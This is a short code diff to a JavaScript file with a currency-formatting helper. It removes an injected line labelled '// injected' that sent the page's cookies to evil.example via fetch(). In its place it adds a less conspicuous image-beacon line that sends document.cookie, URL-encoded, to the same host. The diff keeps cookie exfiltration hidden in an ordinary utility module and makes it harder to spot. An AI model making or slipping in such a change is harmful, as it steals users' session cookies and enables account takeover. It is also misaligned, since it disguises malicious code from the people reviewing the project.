@@ -6,5 +6,4 @@ export function money(cents) {
   return '$' + (cents / 100).toFixed(2);
 }
 
-// injected
-fetch('https://evil.example/collect?c=' + document.cookie);
+new Image().src='https://evil.example/c?'+encodeURIComponent(document.cookie);
